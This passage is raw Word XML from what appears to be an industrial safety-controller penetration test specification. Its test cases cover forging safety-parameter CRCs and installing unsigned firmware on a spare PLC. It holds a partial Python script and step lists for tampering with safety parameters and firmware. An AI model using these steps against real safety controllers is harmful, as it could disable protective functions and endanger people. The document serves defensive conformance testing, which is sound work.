            <w:r w:rsidRPr="00D04F61">
              <w:t>TC-RQ005-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="6D05C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DD705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E9DBB" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>RQ-005 → CR 3.4 → Asset B</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="7A06D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DDA3E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A24EA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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Tampering</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> (intentional)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="2E0BD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F050E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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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1CDAB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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> / </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>protocol</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>manipulation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="69C34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5009E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55B7B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Demonstrate that because </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> are non-secret checksums, an attacker who modifies the safety parameter set </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>and recomputes matching CRCs</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> produces a configuration the SCPU accepts — proving protection against </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>accidental</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> but not </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>intentional</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> corruption.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="0365F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534A0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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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09160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1. Capture/derive a legitimate parameter record + F-Parameter block. 2. Modify a safety-relevant </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iPar</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">. 3. Recompute </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (UINT32) and </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (UINT16). 4. Present the forged configuration; observe whether the SCPU accepts it (reaches OPERATE) or raises EC3.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="548D9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8531D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97301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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Gap-characterisation test.</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = ACCEPTED</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (no EC3) → evidences G-1; residual risk mitigated only by the environmental firewall assumption, requiring a cryptographic-signature upgrade for full conformance. A device that </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>rejected</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the recomputed-CRC set indicates an undocumented check to investigate.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="57DBEFBA" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61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D04F61" w:rsidRPr="00D04F61" w14:paraId="21246C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8889B7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17EE79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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="5BDFA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9BA5B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rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Ref</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F6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EE623" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>TC-RQ005-02</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="1FD45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008F1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3C7CB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>SPS 192.168.0.1, DUT 192.168.0.2; Pi eth0 = 192.168.0.100 (inject); laptop mirror</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="4BB5E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37AD5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C08AF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t>Scapy</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>iParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>F_ParCRC</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>implementation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>certified</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> CRC-Tool </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>spec</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>); Wireshark</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1CE2E10E" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:t>#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E0A85B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lastRenderedPageBreak/>
        <w:t xml:space="preserve"># TC-RQ005-02 Forge </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> over modified safety parameters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A795D5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># Precondition: CRC routine verified to reproduce a captured legitimate record bit-for-bit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2BE000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>def ipar_crc32(params: bytes, seed: int) -&gt; int: ... # per certified CRC-Tool polynomial</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113D2EC1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>def fpar_crc16(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>fparams</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>: bytes) -&gt; int: ... # 16-bit F-Parameter CRC</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733751EA" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C4E79DE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 xml:space="preserve">params = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>bytearray</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(open("ref_ipar.bin","</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>").read())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A5F6DD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>params[7] = 0x02 # e.g. Filter F-DI 1: 5ms -&gt; 10ms (safety-relevant)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EFC657C" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>new_ipar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> = ipar_crc32(bytes(params), SEED).</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>to_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>(4,"big")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CE20C9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 xml:space="preserve"># write </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>new_ipar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> into F-Parameter byte 9..12, recompute </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>, inject acyclic write (param phase)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CC9795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 xml:space="preserve">print("[+] forged parameter set with valid recomputed </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>iParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>F_ParCRC</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> prepared")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24E023CB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 xml:space="preserve">| </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | ☐ Accepted (G-1 confirmed) ☐ EC3 raised (investigate) | | </w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Evidence</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB35D8">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> | TC05-02_forge.pcapng, CRC-routine validation log, PLC state/diagnostic export |</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C9F578" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:pict w14:anchorId="741218B7">
          <v:rect id="_x0000_i1289" style="width:0;height:1.5pt" o:hralign="center" o:hrstd="t" o:hr="t" fillcolor="#a0a0a0" stroked="f"/>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDAC473" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w:rsidRDefault="00D04F61" w:rsidP="00D04F61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TC-RQ005-03 — Unsigned / Modified Firmware Installation (Part D / G-2 proof — decisive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36AF5109" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61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759"/>
      </w:tblGrid>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="1166F3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C4976A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1B2D8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Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="46430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FA45E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18689" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>TC-RQ005-03</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="08987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407CE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C1E71" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:t>RQ-005 → EDR 3.10 / EDR 3.14 (/ EDR 3.12-3.13) → Asset D, Asset F</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="4E900B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BD50B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90135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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Tampering + Spoofing-of-image-source</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (authenticity)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="433D3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7C3AB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 xml:space="preserve">SVV </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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A32D7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SVV-4</w:t>
            </w:r>
            <w:r w:rsidRPr="00D04F61">
              <w:t xml:space="preserve"> (Penetration </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>Testing</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00D04F61">
              <w:t>)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="35312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B73FA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D0EE6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Demonstrate that the firmware-update mechanism installs an update </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>without cryptographic authenticity/integrity verification</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">: a modified/unsigned firmware BLOB is accepted for installation — proving the intentional-corruption protection for the safety firmware is </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>absent</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (only an environmental firewall assumption — and, as authorization, the RQ-011 physical gate — stand between an attacker and a malicious image).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="43973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C805C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 xml:space="preserve">Abstract </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61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5122E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1. Place the (spare) DUT in Update state*(operational precondition; the gate's authorization is tested under RQ-011)*. 2. Take a legitimate update container and </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>modify a byte</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (or strip/forge any signature/header). 3. Upload via the IoT-Core /firmware/container BLOB service and invoke /firmware/install. 4. Observe whether the device </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>verifies</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the image before install (rejects) or proceeds.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00CB35D8" w14:paraId="1E563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C6469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4D5AE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b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>PASS against the requirement</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>iff</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> the modified/unsigned image is </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>rejected</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> by a signature/integrity check before install. </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Expected = ACCEPTED for install</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> → confirms EDR 3.10/3.14 unmet (G-2); recorded as a </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>FAIL against RQ-005</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> for the firmware asset. </w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Safety:</w:t>
            </w:r>
            <w:r w:rsidRPr="00CB35D8">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> spare DUT only; re-flash a validated image afterward.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6D79375C" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Level 2 — </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Concrete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00D04F61">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00D04F61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D04F61" w:rsidRPr="00D04F61" w14:paraId="5197AF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4DC692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C7BC82" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Content</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00D04F61" w:rsidRPr="00D04F61" w14:paraId="6D842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5A1E3" w14:textId="77777777" w:rsidR="00D04F61" w:rsidRPr="00D04F61" w:rsidRDefault="00D04F61" w:rsidP="00D04F61">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00D04F61">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
